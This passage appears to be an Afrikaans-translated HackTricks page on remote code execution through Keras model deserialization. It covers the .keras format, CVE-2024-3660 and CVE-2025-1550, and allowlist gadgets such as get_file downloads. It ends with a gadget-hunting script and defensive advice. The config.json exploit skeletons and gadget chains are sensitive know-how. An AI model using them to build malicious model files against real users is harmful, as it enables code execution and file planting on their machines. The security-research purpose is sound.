# Keras Model Deserialization RCE en Gadget Jag

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy somariseer praktiese eksploitasiemetodes teen die Keras model deserialisering pyplyn, verduidelik die inwendige werking van die .keras formaat en aanvaloppervlak, en bied 'n navorsersgereedskapstel vir die vind van Model File Vulnerabilities (MFVs) en post-fix gadgets.

## .keras model formaat inwendige werking

'n .keras lêer is 'n ZIP-argief wat ten minste bevat:
- metadata.json – generiese inligting (bv. Keras weergawe)
- config.json – model argitektuur (primêre aanvaloppervlak)
- model.weights.h5 – gewigte in HDF5

Die config.json dryf rekursiewe deserialisering: Keras importeer modules, los klasse/funksies op en herbou lae/objekte uit aanvaller-beheerde woordeboeke.

Voorbeeld snit vir 'n Dense lae objek:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialisering voer uit:
- Modulêre invoer en simboolresolusie vanaf module/class_name sleutels
- from_config(...) of konstruktorkalling met aanvaller-beheerde kwargs
- Rekursie in geneste objekte (aktiverings, inisialisators, beperkings, ens.)

Histories het dit drie primitiewe aan 'n aanvaller blootgestel wat config.json saamstel:
- Beheer oor watter modules ingevoer word
- Beheer oor watter klasse/funksies opgelos word
- Beheer oor kwargs wat in konstruktors/from_config oorgedra word

## CVE-2024-3660 – Lambda-laag bytecode RCE

Wortel oorsaak:
- Lambda.from_config() het python_utils.func_load(...) gebruik wat base64-decode en marshal.loads() op aanvaller bytes aanroep; Python unmarshalling kan kode uitvoer.

Eksploitasie idee (vereenvoudigde payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigering:
- Keras afdwing safe_mode=True standaard. Gekodeerde Python funksies in Lambda word geblokkeer tensy 'n gebruiker eksplisiet opt-out met safe_mode=False.

Notas:
- Erflike formate (ou HDF5 stoor) of ou kodebasisse mag nie moderne kontroles afdwing nie, so “downgrade” styl aanvalle kan steeds van toepassing wees wanneer slagoffers ou laders gebruik.

## CVE-2025-1550 – Arbitraire module invoer in Keras ≤ 3.8

Oorsaak:
- _retrieve_class_or_fn het onbeperkte importlib.import_module() gebruik met aanvaller-beheerde module stringe van config.json.
- Impak: Arbitraire invoer van enige geïnstalleerde module (of aanvaller-geplante module op sys.path). Invoer-tyd kode loop, dan vind objekkonstruksie plaas met aanvaller kwargs.

Eksploit idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Security improvements (Keras ≥ 3.9):
- Module allowlist: imports beperk tot amptelike ekosisteem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blokkeer onveilige Lambda geserialiseerde-funksie laai
- Basic type checking: gedeserialiseerde objekte moet ooreenstem met verwagte tipes

## Post-fix gadget oppervlak binne allowlist

Selfs met allowlisting en safe mode, bly 'n breë oppervlak oor onder toegelate Keras aanroepbare. Byvoorbeeld, keras.utils.get_file kan arbitrêre URL's na gebruiker-keur plekke aflaai.

Gadget via Lambda wat 'n toegelate funksie verwys (nie geserialiseerde Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- Lambda.call() voeg die invoertensor as die eerste posisionele argument by wanneer die teiken aanroepbare aangeroep word. Gekoze gadgets moet 'n ekstra posisionele arg (of *args/**kwargs) kan hanteer. Dit beperk watter funksies lewensvatbaar is.

Potensiële impakte van toegelate gadgets:
- Arbitraire aflaai/skryf (padplanting, konfigurasie vergiftiging)
- Netwerk terugroepe/SSRF-agtige effekte afhangende van die omgewing
- Ketting na kode-uitvoering as geskryfde pades later ingevoer/uitgevoer word of by PYTHONPATH gevoeg word, of as 'n skryfbare uitvoering-op-skryf ligging bestaan

## Navorsers gereedskap

1) Sistematiese gadget ontdekking in toegelate modules

Tel kandidaat aanroepbares op oor keras, keras_nlp, keras_cv, keras_hub en prioritiseer dié met lêer/netwerk/proses/omgewing newe-effekte.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Direkte deserialiseringstoetsing (geen .keras-argief benodig nie)

Voer vervaardigde dikte direk in Keras-deserialiseerders in om aanvaarbare parameters te leer en om effekte te observeer.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Cross-version probing en formate

Keras bestaan in verskeie kodebasisse/era met verskillende veiligheidsmaatreëls en formate:
- TensorFlow ingeboude Keras: tensorflow/python/keras (erfgoed, beplan vir verwydering)
- tf-keras: apart onderhou
- Multi-backend Keras 3 (amptelik): het inheemse .keras bekendgestel

Herhaal toetse oor kodebasisse en formate (.keras vs erfgoed HDF5) om regressies of ontbrekende veiligheidsmaatreëls te ontdek.

## Verdedigende aanbevelings

- Behandel model lêers as onbetroubare invoer. Laai slegs modelle van betroubare bronne.
- Hou Keras op datum; gebruik Keras ≥ 3.9 om voordeel te trek uit toelaatlys en tipe kontroles.
- Moet nie safe_mode=False stel wanneer jy modelle laai nie, tensy jy die lêer ten volle vertrou.
- Oorweeg om deserialisering in 'n sandboxed, minste-bevoorregte omgewing sonder netwerkuitgang en met beperkte lêerstelsels toegang te laat plaasvind.
- Handhaaf toelaatlyste/handtekeninge vir modelbronne en integriteitskontrole waar moontlik.

## Verwysings

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
